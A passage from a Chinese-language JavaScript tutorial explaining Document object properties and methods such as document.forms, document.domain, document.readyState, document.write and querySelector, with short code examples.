name=\"foo\" id=\"bar\"></form> */ document . forms [ 0 ] === document . forms . foo // true document . forms . bar === document . forms . foo // true \uff083\uff09document.images document.images \u5c5e\u6027\u8fd4\u56de\u9875\u9762\u6240\u6709 <img> \u56fe\u7247\u8282\u70b9\u3002 1 2 3 4 5 6 7 var imglist = document . images ; for ( var i = 0 ; i < imglist . length ; i ++ ) { if ( imglist [ i ]. src === 'banner.gif' ) { // ... } } \u4e0a\u9762\u4ee3\u7801\u5728\u6240\u6709 img \u6807\u7b7e\u4e2d\uff0c\u5bfb\u627e\u67d0\u5f20\u56fe\u7247\u3002 \uff084\uff09document.embeds\uff0cdocument.plugins document.embeds \u5c5e\u6027\u548c document.plugins \u5c5e\u6027\uff0c\u90fd\u8fd4\u56de\u6240\u6709 <embed> \u8282\u70b9\u3002 \uff085\uff09document.scripts document.scripts \u5c5e\u6027\u8fd4\u56de\u6240\u6709 <script> \u8282\u70b9\u3002 1 2 3 4 var scripts = document . scripts ; if ( scripts . length !== 0 ) { console . log ( '\u5f53\u524d\u7f51\u9875\u6709\u811a\u672c' ); } \uff086\uff09document.styleSheets document.styleSheets \u5c5e\u6027\u8fd4\u56de\u7f51\u9875\u5185\u5d4c\u6216\u5f15\u5165\u7684 CSS \u6837\u5f0f\u8868\u96c6\u5408\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u8bf7\u770b\u300aCSS \u64cd\u4f5c\u300b\u4e00\u7ae0\u3002 \uff087\uff09\u5c0f\u7ed3 \u9664\u4e86 document.styleSheets \u5c5e\u6027\uff0c\u4ee5\u4e0a\u7684\u5176\u4ed6\u96c6\u5408\u5c5e\u6027\u8fd4\u56de\u7684\u90fd\u662f HTMLCollection \u5b9e\u4f8b\u3002 document.styleSheets \u5c5e\u6027\u8fd4\u56de\u7684\u662f StyleSheetList \u5b9e\u4f8b\u3002 1 2 3 4 5 document . links instanceof HTMLCollection // true document . images instanceof HTMLCollection // true document . forms instanceof HTMLCollection // true document . embeds instanceof HTMLCollection // true document . scripts instanceof HTMLCollection // true HTMLCollection \u5b9e\u4f8b\u662f\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u6240\u4ee5\u4e0a\u9762\u8fd9\u4e9b\u5c5e\u6027\u90fd\u6709 length \u5c5e\u6027\uff0c\u90fd\u53ef\u4ee5\u4f7f\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\u5f15\u7528\u6210\u5458\u3002\u5982\u679c\u6210\u5458\u6709 id \u6216 name \u5c5e\u6027\uff0c\u8fd8\u53ef\u4ee5\u7528\u8fd9\u4e24\u4e2a\u5c5e\u6027\u7684\u503c\uff0c\u5728 HTMLCollection \u5b9e\u4f8b\u4e0a\u5f15\u7528\u5230\u8fd9\u4e2a\u6210\u5458\u3002 1 2 3 // HTML \u4ee3\u7801\u5982\u4e0b // <form name=\"myForm\"> document . myForm === document . forms . myForm // true \u6587\u6863\u9759\u6001\u4fe1\u606f\u5c5e\u6027 \u00b6 \u4ee5\u4e0b\u5c5e\u6027\u8fd4\u56de\u6587\u6863\u4fe1\u606f\u3002 \uff081\uff09document.documentURI\uff0cdocument.URL document.documentURI \u5c5e\u6027\u548c document.URL \u5c5e\u6027\u90fd\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u6587\u6863\u7684\u7f51\u5740\u3002\u4e0d\u540c\u4e4b\u5904\u662f\u5b83\u4eec\u7ee7\u627f\u81ea\u4e0d\u540c\u7684\u63a5\u53e3\uff0c documentURI \u7ee7\u627f\u81ea Document \u63a5\u53e3\uff0c\u53ef\u7528\u4e8e\u6240\u6709\u6587\u6863\uff1b URL \u7ee7\u627f\u81ea HTMLDocument \u63a5\u53e3\uff0c\u53ea\u80fd\u7528\u4e8e HTML \u6587\u6863\u3002 1 2 3 4 5 document . URL // http://www.example.com/about document . documentURI === document . URL // true \u5982\u679c\u6587\u6863\u7684\u951a\u70b9\uff08 #anchor \uff09\u53d8\u5316\uff0c\u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u4f1a\u8ddf\u7740\u53d8\u5316\u3002 \uff082\uff09document.domain document.domain \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u6587\u6863\u7684\u57df\u540d\uff0c\u4e0d\u5305\u542b\u534f\u8bae\u548c\u7aef\u53e3\u3002\u6bd4\u5982\uff0c\u7f51\u9875\u7684\u7f51\u5740\u662f http://www.example.com:80/hello.html \uff0c\u90a3\u4e48 document.domain \u5c5e\u6027\u5c31\u7b49\u4e8e www.example.com \u3002\u5982\u679c\u65e0\u6cd5\u83b7\u53d6\u57df\u540d\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 document.domain \u57fa\u672c\u4e0a\u662f\u4e00\u4e2a\u53ea\u8bfb\u5c5e\u6027\uff0c\u53ea\u6709\u4e00\u79cd\u60c5\u51b5\u9664\u5916\u3002\u6b21\u7ea7\u57df\u540d\u7684\u7f51\u9875\uff0c\u53ef\u4ee5\u628a document.domain \u8bbe\u4e3a\u5bf9\u5e94\u7684\u4e0a\u7ea7\u57df\u540d\u3002\u6bd4\u5982\uff0c\u5f53\u524d\u57df\u540d\u662f a.sub.example.com \uff0c\u5219 document.domain \u5c5e\u6027\u53ef\u4ee5\u8bbe\u7f6e\u4e3a sub.example.com \uff0c\u4e5f\u53ef\u4ee5\u8bbe\u4e3a example.com \u3002\u4fee\u6539\u540e\uff0c document.domain \u76f8\u540c\u7684\u4e24\u4e2a\u7f51\u9875\uff0c\u53ef\u4ee5\u8bfb\u53d6\u5bf9\u65b9\u7684\u8d44\u6e90\uff0c\u6bd4\u5982\u8bbe\u7f6e\u7684 Cookie\u3002 \u53e6\u5916\uff0c\u8bbe\u7f6e document.domain \u4f1a\u5bfc\u81f4\u7aef\u53e3\u88ab\u6539\u6210 null \u3002\u56e0\u6b64\uff0c\u5982\u679c\u901a\u8fc7\u8bbe\u7f6e document.domain \u6765\u8fdb\u884c\u901a\u4fe1\uff0c\u53cc\u65b9\u7f51\u9875\u90fd\u5fc5\u987b\u8bbe\u7f6e\u8fd9\u4e2a\u503c\uff0c\u624d\u80fd\u4fdd\u8bc1\u7aef\u53e3\u76f8\u540c\u3002 \uff083\uff09document.location Location \u5bf9\u8c61\u662f\u6d4f\u89c8\u5668\u63d0\u4f9b\u7684\u539f\u751f\u5bf9\u8c61\uff0c\u63d0\u4f9b URL \u76f8\u5173\u7684\u4fe1\u606f\u548c\u64cd\u4f5c\u65b9\u6cd5\u3002\u901a\u8fc7 window.location \u548c document.location \u5c5e\u6027\uff0c\u53ef\u4ee5\u62ff\u5230\u8fd9\u4e2a\u5bf9\u8c61\u3002 \u5173\u4e8e\u8fd9\u4e2a\u5bf9\u8c61\u7684\u8be6\u7ec6\u4ecb\u7ecd\uff0c\u8bf7\u770b\u300a\u6d4f\u89c8\u5668\u6a21\u578b\u300b\u90e8\u5206\u7684\u300aLocation \u5bf9\u8c61\u300b\u7ae0\u8282\u3002 \uff084\uff09document.lastModified document.lastModified \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u6587\u6863\u6700\u540e\u4fee\u6539\u7684\u65f6\u95f4\u3002\u4e0d\u540c\u6d4f\u89c8\u5668\u7684\u8fd4\u56de\u503c\uff0c\u65e5\u671f\u683c\u5f0f\u662f\u4e0d\u4e00\u6837\u7684\u3002 1 2 document . lastModified // \"03/07/2018 11:18:27\" \u6ce8\u610f\uff0c document.lastModified \u5c5e\u6027\u7684\u503c\u662f\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u7528\u6765\u6bd4\u8f83\u3002 Date.parse \u65b9\u6cd5\u5c06\u5176\u8f6c\u4e3a Date \u5b9e\u4f8b\uff0c\u624d\u80fd\u6bd4\u8f83\u4e24\u4e2a\u7f51\u9875\u3002 1 2 3 4 var lastVisitedDate = Date . parse ( '01/01/2018' ); if ( Date . parse ( document . lastModified ) > lastVisitedDate ) { console . log ( '\u7f51\u9875\u5df2\u7ecf\u53d8\u66f4' ); } \u5982\u679c\u9875\u9762\u4e0a\u6709 JavaScript \u751f\u6210\u7684\u5185\u5bb9\uff0c document.lastModified \u5c5e\u6027\u8fd4\u56de\u7684\u603b\u662f\u5f53\u524d\u65f6\u95f4\u3002 \uff085\uff09document.title document.title \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u6587\u6863\u7684\u6807\u9898\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8fd4\u56de <title> \u8282\u70b9\u7684\u503c\u3002\u4f46\u662f\u8be5\u5c5e\u6027\u662f\u53ef\u5199\u7684\uff0c\u4e00\u65e6\u88ab\u4fee\u6539\uff0c\u5c31\u8fd4\u56de\u4fee\u6539\u540e\u7684\u503c\u3002 1 2 document . title = '\u65b0\u6807\u9898' ; document . title // \"\u65b0\u6807\u9898\" \uff086\uff09document.characterSet document.characterSet \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u6587\u6863\u7684\u7f16\u7801\uff0c\u6bd4\u5982 UTF-8 \u3001 ISO-8859-1 \u7b49\u7b49\u3002 \uff087\uff09document.referrer document.referrer \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u6587\u6863\u7684\u8bbf\u95ee\u8005\u6765\u81ea\u54ea\u91cc\u3002 1 2 document . referrer // \"https://example.com/path\" \u5982\u679c\u65e0\u6cd5\u83b7\u53d6\u6765\u6e90\uff0c\u6216\u8005\u7528\u6237\u76f4\u63a5\u952e\u5165\u7f51\u5740\u800c\u4e0d\u662f\u4ece\u5176\u4ed6\u7f51\u9875\u70b9\u51fb\u8fdb\u5165\uff0c document.referrer \u8fd4\u56de\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\u3002 document.referrer \u7684\u503c\uff0c\u603b\u662f\u4e0e HTTP \u5934\u4fe1\u606f\u7684 Referer \u5b57\u6bb5\u4fdd\u6301\u4e00\u81f4\u3002\u4f46\u662f\uff0c document.referrer \u7684\u62fc\u5199\u6709\u4e24\u4e2a r \uff0c\u800c\u5934\u4fe1\u606f\u7684 Referer \u5b57\u6bb5\u53ea\u6709\u4e00\u4e2a r \u3002 \uff088\uff09document.dir document.dir \u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6587\u5b57\u65b9\u5411\u3002\u5b83\u53ea\u6709\u4e24\u4e2a\u53ef\u80fd\u7684\u503c\uff1a rtl \u8868\u793a\u6587\u5b57\u4ece\u53f3\u5230\u5de6\uff0c\u963f\u62c9\u4f2f\u6587\u662f\u8fd9\u79cd\u65b9\u5f0f\uff1b ltr \u8868\u793a\u6587\u5b57\u4ece\u5de6\u5230\u53f3\uff0c\u5305\u62ec\u82f1\u8bed\u548c\u6c49\u8bed\u5728\u5185\u7684\u5927\u591a\u6570\u6587\u5b57\u91c7\u7528\u8fd9\u79cd\u65b9\u5f0f\u3002 \uff089\uff09document.compatMode compatMode \u5c5e\u6027\u8fd4\u56de\u6d4f\u89c8\u5668\u5904\u7406\u6587\u6863\u7684\u6a21\u5f0f\uff0c\u53ef\u80fd\u7684\u503c\u4e3a BackCompat \uff08\u5411\u540e\u517c\u5bb9\u6a21\u5f0f\uff09\u548c CSS1Compat \uff08\u4e25\u683c\u6a21\u5f0f\uff09\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u7f51\u9875\u4ee3\u7801\u7684\u7b2c\u4e00\u884c\u8bbe\u7f6e\u4e86\u660e\u786e\u7684 DOCTYPE \uff08\u6bd4\u5982 <!doctype html> \uff09\uff0c document.compatMode \u7684\u503c\u90fd\u4e3a CSS1Compat \u3002 \u6587\u6863\u72b6\u6001\u5c5e\u6027 \u00b6 \uff081\uff09document.hidden document.hidden \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u9875\u9762\u662f\u5426\u53ef\u89c1\u3002\u5982\u679c\u7a97\u53e3\u6700\u5c0f\u5316\u3001\u6d4f\u89c8\u5668\u5207\u6362\u4e86 Tab\uff0c\u90fd\u4f1a\u5bfc\u81f4\u5bfc\u81f4\u9875\u9762\u4e0d\u53ef\u89c1\uff0c\u4f7f\u5f97 document.hidden \u8fd4\u56de true \u3002 \u8fd9\u4e2a\u5c5e\u6027\u662f Page Visibility API \u5f15\u5165\u7684\uff0c\u4e00\u822c\u90fd\u662f\u914d\u5408\u8fd9\u4e2a API \u4f7f\u7528\u3002 \uff082\uff09document.visibilityState document.visibilityState \u8fd4\u56de\u6587\u6863\u7684\u53ef\u89c1\u72b6\u6001\u3002 \u5b83\u7684\u503c\u6709\u56db\u79cd\u53ef\u80fd\u3002 visible \uff1a\u9875\u9762\u53ef\u89c1\u3002\u6ce8\u610f\uff0c\u9875\u9762\u53ef\u80fd\u662f\u90e8\u5206\u53ef\u89c1\uff0c\u5373\u4e0d\u662f\u7126\u70b9\u7a97\u53e3\uff0c\u524d\u9762\u88ab\u5176\u4ed6\u7a97\u53e3\u90e8\u5206\u6321\u4f4f\u4e86\u3002 hidden \uff1a\u9875\u9762\u4e0d\u53ef\u89c1\uff0c\u6709\u53ef\u80fd\u7a97\u53e3\u6700\u5c0f\u5316\uff0c\u6216\u8005\u6d4f\u89c8\u5668\u5207\u6362\u5230\u4e86\u53e6\u4e00\u4e2a Tab\u3002 prerender \uff1a\u9875\u9762\u5904\u4e8e\u6b63\u5728\u6e32\u67d3\u72b6\u6001\uff0c\u5bf9\u4e8e\u7528\u6237\u6765\u8bf4\uff0c\u8be5\u9875\u9762\u4e0d\u53ef\u89c1\u3002 unloaded \uff1a\u9875\u9762\u4ece\u5185\u5b58\u91cc\u9762\u5378\u8f7d\u4e86\u3002 \u8fd9\u4e2a\u5c5e\u6027\u53ef\u4ee5\u7528\u5728\u9875\u9762\u52a0\u8f7d\u65f6\uff0c\u9632\u6b62\u52a0\u8f7d\u67d0\u4e9b\u8d44\u6e90\uff1b\u6216\u8005\u9875\u9762\u4e0d\u53ef\u89c1\u65f6\uff0c\u505c\u6389\u4e00\u4e9b\u9875\u9762\u529f\u80fd\u3002 \uff083\uff09document.readyState document.readyState \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u6587\u6863\u7684\u72b6\u6001\uff0c\u5171\u6709\u4e09\u79cd\u53ef\u80fd\u7684\u503c\u3002 loading \uff1a\u52a0\u8f7d HTML \u4ee3\u7801\u9636\u6bb5\uff08\u5c1a\u672a\u5b8c\u6210\u89e3\u6790\uff09 interactive \uff1a\u52a0\u8f7d\u5916\u90e8\u8d44\u6e90\u9636\u6bb5 complete \uff1a\u52a0\u8f7d\u5b8c\u6210 \u8fd9\u4e2a\u5c5e\u6027\u53d8\u5316\u7684\u8fc7\u7a0b\u5982\u4e0b\u3002 \u6d4f\u89c8\u5668\u5f00\u59cb\u89e3\u6790 HTML \u6587\u6863\uff0c document.readyState \u5c5e\u6027\u7b49\u4e8e loading \u3002 \u6d4f\u89c8\u5668\u9047\u5230 HTML \u6587\u6863\u4e2d\u7684 <script> \u5143\u7d20\uff0c\u5e76\u4e14\u6ca1\u6709 async \u6216 defer \u5c5e\u6027\uff0c\u5c31\u6682\u505c\u89e3\u6790\uff0c\u5f00\u59cb\u6267\u884c\u811a\u672c\uff0c\u8fd9\u65f6 document.readyState \u5c5e\u6027\u8fd8\u662f\u7b49\u4e8e loading \u3002 HTML \u6587\u6863\u89e3\u6790\u5b8c\u6210\uff0c document.readyState \u5c5e\u6027\u53d8\u6210 interactive \u3002 \u6d4f\u89c8\u5668\u7b49\u5f85\u56fe\u7247\u3001\u6837\u5f0f\u8868\u3001\u5b57\u4f53\u6587\u4ef6\u7b49\u5916\u90e8\u8d44\u6e90\u52a0\u8f7d\u5b8c\u6210\uff0c\u4e00\u65e6\u5168\u90e8\u52a0\u8f7d\u5b8c\u6210\uff0c document.readyState \u5c5e\u6027\u53d8\u6210 complete \u3002 \u4e0b\u9762\u7684\u4ee3\u7801\u7528\u6765\u68c0\u67e5\u7f51\u9875\u662f\u5426\u52a0\u8f7d\u6210\u529f\u3002 1 2 3 4 5 6 7 8 9 10 11 12 // \u57fa\u672c\u68c0\u67e5 if ( document . readyState === 'complete' ) { // ... } // \u8f6e\u8be2\u68c0\u67e5 var interval = setInterval ( function () { if ( document . readyState === 'complete' ) { clearInterval ( interval ); // ... } }, 100 ); \u53e6\u5916\uff0c\u6bcf\u6b21\u72b6\u6001\u53d8\u5316\u90fd\u4f1a\u89e6\u53d1\u4e00\u4e2a readystatechange \u4e8b\u4ef6\u3002 document.cookie \u00b6 document.cookie \u5c5e\u6027\u7528\u6765\u64cd\u4f5c\u6d4f\u89c8\u5668 Cookie\uff0c\u8be6\u89c1\u300a\u6d4f\u89c8\u5668\u6a21\u578b\u300b\u90e8\u5206\u7684\u300aCookie\u300b\u7ae0\u8282\u3002 document.designMode \u00b6 document.designMode \u5c5e\u6027\u63a7\u5236\u5f53\u524d\u6587\u6863\u662f\u5426\u53ef\u7f16\u8f91\u3002\u8be5\u5c5e\u6027\u53ea\u6709\u4e24\u4e2a\u503c on \u548c off \uff0c\u9ed8\u8ba4\u503c\u4e3a off \u3002\u4e00\u65e6\u8bbe\u4e3a on \uff0c\u7528\u6237\u5c31\u53ef\u4ee5\u7f16\u8f91\u6574\u4e2a\u6587\u6863\u7684\u5185\u5bb9\u3002 \u4e0b\u9762\u4ee3\u7801\u6253\u5f00 iframe \u5143\u7d20\u5185\u90e8\u6587\u6863\u7684 designMode \u5c5e\u6027\uff0c\u5c31\u80fd\u5c06\u5176\u53d8\u4e3a\u4e00\u4e2a\u6240\u89c1\u5373\u6240\u5f97\u7684\u7f16\u8f91\u5668\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <iframe id=\"editor\" src=\"about:blank\"></iframe> var editor = document . getElementById ( 'editor' ); editor . contentDocument . designMode = 'on' ; document.currentScript \u00b6 document.currentScript \u5c5e\u6027\u53ea\u7528\u5728 <script> \u5143\u7d20\u7684\u5185\u5d4c\u811a\u672c\u6216\u52a0\u8f7d\u7684\u5916\u90e8\u811a\u672c\u4e4b\u4e2d\uff0c\u8fd4\u56de\u5f53\u524d\u811a\u672c\u6240\u5728\u7684\u90a3\u4e2a DOM \u8282\u70b9\uff0c\u5373 <script> \u5143\u7d20\u7684 DOM \u8282\u70b9\u3002 1 2 3 4 5 < script id = \"foo\" > console . log ( document . currentScript === document . getElementById ( 'foo' ) ); // true </ script > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c document.currentScript \u5c31\u662f <script> \u5143\u7d20\u8282\u70b9\u3002 document.implementation \u00b6 document.implementation \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a DOMImplementation \u5bf9\u8c61\u3002\u8be5\u5bf9\u8c61\u6709\u4e09\u4e2a\u65b9\u6cd5\uff0c\u4e3b\u8981\u7528\u4e8e\u521b\u5efa\u72ec\u7acb\u4e8e\u5f53\u524d\u6587\u6863\u7684\u65b0\u7684 Document \u5bf9\u8c61\u3002 DOMImplementation.createDocument() \uff1a\u521b\u5efa\u4e00\u4e2a XML \u6587\u6863\u3002 DOMImplementation.createHTMLDocument() \uff1a\u521b\u5efa\u4e00\u4e2a HTML \u6587\u6863\u3002 DOMImplementation.createDocumentType() \uff1a\u521b\u5efa\u4e00\u4e2a DocumentType \u5bf9\u8c61\u3002 \u4e0b\u9762\u662f\u521b\u5efa HTML \u6587\u6863\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 var doc = document . implementation . createHTMLDocument ( 'Title' ); var p = doc . createElement ( 'p' ); p . innerHTML = 'hello world' ; doc . body . appendChild ( p ); document . replaceChild ( doc . documentElement , document . documentElement ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u6b65\u751f\u6210\u4e00\u4e2a\u65b0\u7684 HTML \u6587\u6863 doc \uff0c\u7136\u540e\u7528\u5b83\u7684\u6839\u5143\u7d20 document.documentElement \u66ff\u6362\u6389 document.documentElement \u3002\u8fd9\u4f1a\u4f7f\u5f97\u5f53\u524d\u6587\u6863\u7684\u5185\u5bb9\u5168\u90e8\u6d88\u5931\uff0c\u53d8\u6210 hello world \u3002 \u65b9\u6cd5 \u00b6 document.open()\uff0cdocument.close() \u00b6 document.open \u65b9\u6cd5\u6e05\u9664\u5f53\u524d\u6587\u6863\u6240\u6709\u5185\u5bb9\uff0c\u4f7f\u5f97\u6587\u6863\u5904\u4e8e\u53ef\u5199\u72b6\u6001\uff0c\u4f9b document.write \u65b9\u6cd5\u5199\u5165\u5185\u5bb9\u3002 document.close \u65b9\u6cd5\u7528\u6765\u5173\u95ed document.open() \u6253\u5f00\u7684\u6587\u6863\u3002 1 2 3 document . open (); document . write ( 'hello world' ); document . close (); document.write()\uff0cdocument.writeln() \u00b6 document.write \u65b9\u6cd5\u7528\u4e8e\u5411\u5f53\u524d\u6587\u6863\u5199\u5165\u5185\u5bb9\u3002 \u5728\u7f51\u9875\u7684\u9996\u6b21\u6e32\u67d3\u9636\u6bb5\uff0c\u53ea\u8981\u9875\u9762\u6ca1\u6709\u5173\u95ed\u5199\u5165\uff08\u5373\u6ca1\u6709\u6267\u884c document.close() \uff09\uff0c document.write \u5199\u5165\u7684\u5185\u5bb9\u5c31\u4f1a\u8ffd\u52a0\u5728\u5df2\u6709\u5185\u5bb9\u7684\u540e\u9762\u3002 1 2 3 4 5 // \u9875\u9762\u663e\u793a\u201chelloworld\u201d document . open (); document . write ( 'hello' ); document . write ( 'world' ); document . close (); \u6ce8\u610f\uff0c document.write \u4f1a\u5f53\u4f5c HTML \u4ee3\u7801\u89e3\u6790\uff0c\u4e0d\u4f1a\u8f6c\u4e49\u3002 1 document . write ( '<p>hello world</p>' ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c document.write \u4f1a\u5c06 <p> \u5f53\u4f5c HTML \u6807\u7b7e\u89e3\u91ca\u3002 \u5982\u679c\u9875\u9762\u5df2\u7ecf\u89e3\u6790\u5b8c\u6210\uff08 DOMContentLoaded \u4e8b\u4ef6\u53d1\u751f\u4e4b\u540e\uff09\uff0c\u518d\u8c03\u7528 write \u65b9\u6cd5\uff0c\u5b83\u4f1a\u5148\u8c03\u7528 open \u65b9\u6cd5\uff0c\u64e6\u9664\u5f53\u524d\u6587\u6863\u6240\u6709\u5185\u5bb9\uff0c\u7136\u540e\u518d\u5199\u5165\u3002 1 2 3 4 5 6 7 8 9 10 document . addEventListener ( 'DOMContentLoaded' , function ( event ) { document . write ( '<p>Hello World!</p>' ); }); // \u7b49\u540c\u4e8e document . addEventListener ( 'DOMContentLoaded' , function ( event ) { document . open (); document . write ( '<p>Hello World!</p>' ); document . close (); }); \u5982\u679c\u5728\u9875\u9762\u6e32\u67d3\u8fc7\u7a0b\u4e2d\u8c03\u7528 write \u65b9\u6cd5\uff0c\u5e76\u4e0d\u4f1a\u81ea\u52a8\u8c03\u7528 open \u65b9\u6cd5\u3002\uff08\u53ef\u4ee5\u7406\u89e3\u6210\uff0c open \u65b9\u6cd5\u5df2\u8c03\u7528\uff0c\u4f46 close \u65b9\u6cd5\u8fd8\u672a\u8c03\u7528\u3002\uff09 1 2 3 4 5 6 7 8 < html > < body > hello < script type = \"text/javascript\" > document . write ( \"world\" ) </ script > </ body > </ html > \u5728\u6d4f\u89c8\u5668\u6253\u5f00\u4e0a\u9762\u7f51\u9875\uff0c\u5c06\u4f1a\u663e\u793a hello world \u3002 document.write \u662f JavaScript \u8bed\u8a00\u6807\u51c6\u5316\u4e4b\u524d\u5c31\u5b58\u5728\u7684\u65b9\u6cd5\uff0c\u73b0\u5728\u5b8c\u5168\u6709\u66f4\u7b26\u5408\u6807\u51c6\u7684\u65b9\u6cd5\u5411\u6587\u6863\u5199\u5165\u5185\u5bb9\uff08\u6bd4\u5982\u5bf9 innerHTML \u5c5e\u6027\u8d4b\u503c\uff09\u3002\u6240\u4ee5\uff0c\u9664\u4e86\u67d0\u4e9b\u7279\u6b8a\u60c5\u51b5\uff0c\u5e94\u8be5\u5c3d\u91cf\u907f\u514d\u4f7f\u7528 document.write \u8fd9\u4e2a\u65b9\u6cd5\u3002 document.writeln \u65b9\u6cd5\u4e0e write \u65b9\u6cd5\u5b8c\u5168\u4e00\u81f4\uff0c\u9664\u4e86\u4f1a\u5728\u8f93\u51fa\u5185\u5bb9\u7684\u5c3e\u90e8\u6dfb\u52a0\u6362\u884c\u7b26\u3002 1 2 3 4 5 6 7 8 9 document . write ( 1 ); document . write ( 2 ); // 12 document . writeln ( 1 ); document . writeln ( 2 ); // 1 // 2 // \u6ce8\u610f\uff0c writeln \u65b9\u6cd5\u6dfb\u52a0\u7684\u662f ASCII \u7801\u7684\u6362\u884c\u7b26\uff0c\u6e32\u67d3\u6210 HTML \u7f51\u9875\u65f6\u4e0d\u8d77\u4f5c\u7528\uff0c\u5373\u5728\u7f51\u9875\u4e0a\u663e\u793a\u4e0d\u51fa\u6362\u884c\u3002\u7f51\u9875\u4e0a\u7684\u6362\u884c\uff0c\u5fc5\u987b\u663e\u5f0f\u5199\u5165 <br> \u3002 document.querySelector()\uff0cdocument.querySelectorAll() \u00b6 document.querySelector \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a CSS \u9009\u62e9\u5668\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u5339\u914d\u8be5\u9009\u62e9\u5668\u7684\u5143\u7d20\u8282\u70b9\u3002\u5982\u679c\u6709\u591a\u4e2a\u8282\u70b9\u6ee1\u8db3\u5339\u914d\u6761\u4ef6\uff0c\u5219\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5339\u914d\u7684\u8282\u70b9\u3002\u5982\u679c\u6ca1\u6709\u53d1\u73b0\u5339\u914d\u7684\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 2 var el1 = document . querySelector ( '.myclass' ); var el2 = document . querySelector ( '#myParent > [ng-click]' ); document.querySelectorAll \u65b9\u6cd5\u4e0e querySelector \u7528\u6cd5\u7c7b\u4f3c\uff0c\u533a\u522b\u662f\u8fd4\u56de\u4e00\u4e2a NodeList \u5bf9\u8c61\uff0c\u5305\u542b\u6240\u6709\u5339\u914d\u7ed9\u5b9a\u9009\u62e9\u5668\u7684\u8282\u70b9\u3002 1 elementList = document . querySelectorAll ( '.myclass' ); \u8fd9\u4e24\u4e2a\u65b9\u6cd5\u7684\u53c2\u6570\uff0c\u53ef\u4ee5\u662f\u9017\u53f7\u5206\u9694\u7684\u591a\u4e2a CSS \u9009\u62e9\u5668\uff0c\u8fd4\u56de\u5339\u914d\u5176\u4e2d\u4e00\u4e2a\u9009\u62e9\u5668\u7684\u5143\u7d20\u8282\u70b9\uff0c\u8fd9\u4e0e CSS \u9009\u62e9\u5668\u7684\u89c4\u5219\u662f\u4e00\u81f4\u7684\u3002 1 var matches = document . querySelectorAll ( 'div.note, div.alert' ); \u4e0a\u9762\u4ee3\u7801\u8fd4\u56de class \u5c5e\u6027\u662f note \u6216 alert \u7684 div \u5143\u7d20\u3002 \u8fd9\u4e24\u4e2a\u65b9\u6cd5\u90fd\u652f\u6301\u590d\u6742\u7684 CSS \u9009\u62e9\u5668\u3002 1 2 3 4 5 6 7 8 9 10 11 // \u9009\u4e2d data-foo-bar \u5c5e\u6027\u7b49\u4e8e someval \u7684\u5143\u7d20 document . querySelectorAll ( '[data-foo-bar=\"someval\"]' ); // \u9009\u4e2d myForm \u8868\u5355\u4e2d\u6240\u6709\u4e0d\u901a\u8fc7\u9a8c\u8bc1\u7684\u5143\u7d20 document . querySelectorAll ( '#myForm :invalid' ); // \u9009\u4e2ddiv\u5143\u7d20\uff0c\u90a3\u4e9b class \u542b ignore \u7684\u9664\u5916 document . querySelectorAll ( 'DIV:not(.ignore)' ); // \u540c\u65f6\u9009\u4e2d div\uff0ca\uff0cscript \u4e09\u7c7b\u5143\u7d20 document . querySelectorAll ( 'DIV, A, SCRIPT' ); \u4f46\u662f\uff0c\u5b83\u4eec\u4e0d\u652f\u6301 CSS \u4f2a\u5143\u7d20\u7684\u9009\u62e9\u5668\uff08\u6bd4\u5982 :first-line \u548c :first-letter \uff09\u548c\u4f2a\u7c7b\u7684\u9009\u62e9\u5668\uff08\u6bd4\u5982 :link \u548c :visited \uff09\uff0c\u5373\u65e0\u6cd5\u9009\u4e2d\u4f2a\u5143\u7d20\u548c\u4f2a\u7c7b\u3002 \u5982\u679c querySelectorAll \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u5b57\u7b26\u4e32 * \uff0c\u5219\u4f1a\u8fd4\u56de\u6587\u6863\u4e2d\u7684\u6240\u6709\u5143\u7d20\u8282\u70b9\u3002\u53e6\u5916\uff0c querySelectorAll \u7684\u8fd4\u56de\u7ed3\u679c\u4e0d\u662f\u52a8\u6001\u96c6\u5408\uff0c\u4e0d\u4f1a\u5b9e\u65f6\u53cd\u6620\u5143\u7d20\u8282\u70b9\u7684\u53d8\u5316\u3002 \u6700\u540e\uff0c\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u9664\u4e86\u5b9a\u4e49\u5728 document \u5bf9\u8c61\u4e0a\uff0c\u8fd8\u5b9a\u4e49\u5728\u5143\u7d20\u8282\u70b9\u4e0a\uff0c\u5373\u5728\u5143\u7d20\u8282\u70b9\u4e0a\u4e5f\u53ef\u4ee5\u8c03\u7528\u3002 document.getElementsByTagName() \u00b6 document.getElementsByTagName() \u65b9\u6cd5\u641c\u7d22 HTML 